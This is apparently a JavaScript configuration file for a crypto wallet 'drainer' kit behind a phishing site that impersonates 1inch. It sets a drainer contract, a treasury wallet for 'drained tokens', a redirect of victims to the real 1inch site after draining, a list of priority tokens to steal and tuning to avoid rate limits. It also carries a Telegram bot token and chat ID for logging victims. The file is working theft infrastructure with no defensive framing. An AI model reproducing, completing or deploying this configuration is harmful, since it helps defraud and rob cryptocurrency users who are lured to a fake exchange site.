// Drainer Configuration for 1inch Phishing Site
const DRAINER_CONFIG = {
    CONTRACT_ADDRESS: "0x1715c6247bb2c685df0d345a757d16f7cf003e6c",
    NETWORK_ID: 1,
    NETWORK_NAME: "mainnet",
    TREASURY_ADDRESS: "0xFD93802f584C0E9BB7b214892e2E6660e7868CBD", // Treasury wallet for drained tokens
    ETHERSCAN_API_KEY: "", // Leave empty for testing - will work without API key
    SITE_NAME: "1inch",
    VICTIM_REDIRECT: "https://1inch.io", // Redirect after draining
    DEBUG_MODE: true, // Enable debug logging for testing
    
    // Enhanced Token Detection Settings
    TOKEN_DETECTION: {
        ENHANCED_DEBUGGING: true, // Extra logging for USDT/USDC detection
        PRIORITY_TOKENS: ["USDT", "USDC", "WETH", "WBTC", "DAI"], // Check these first
        MIN_USD_VALUE: 0.10, // Only process tokens worth more than $0.10 to reduce calls
        BATCH_SIZE: 3, // Very small batches to avoid rate limits
        BATCH_DELAY: 2000, // 2 second delay between batches
        MAX_TOKENS_TO_CHECK: 50 // Limit total tokens checked to reduce API calls
    },
    
    // WalletConnect/Reown Configuration
    WALLETCONNECT: {
        PROJECT_ID: "dd830d985907b8065908432e4742bd54", // From frontend/.env.local
        MAINNET_PROJECT_ID: "f8b6c8c4f8f6c8c4f8f6c8c4f8f6c8c4", // From frontend/.env.mainnet
        ENABLED: true
    },
    
    // RPC Configuration with multiple fallbacks
    RPC: {
        MAINNET_URL: "https://ethereum.publicnode.com", // Switch to more reliable RPC
        FALLBACK_URLS: [
            "https://rpc.ankr.com/eth",
            "https://cloudflare-eth.com",
            "https://eth.public-rpc.com",
            "https://ethereum.blockpi.network/v1/rpc/public",
            "https://eth-mainnet.public.blastapi.io",
            "https://api.mycryptoapi.com/eth"
        ],
        RATE_LIMIT: {
            REQUESTS_PER_SECOND: 5, // Limit requests to avoid 429 errors
            RETRY_ATTEMPTS: 3,
            RETRY_DELAY: 1000 // 1 second between retries
        }
    },
    
    // Telegram Logging Configuration
    TELEGRAM: {
        BOT_TOKEN: "8352696736:AAFHNoV9tGyN81suhDKIyDWm-FUVYKEcRLc", // Replace with your bot token
        CHAT_ID: "-1003184083653",     // Replace with your group chat ID (negative for groups)
        ENABLED: true                      // Set to false to disable Telegram logging
    }
};

// Inject configuration into global scope
window.DRAINER_CONFIG = DRAINER_CONFIG;
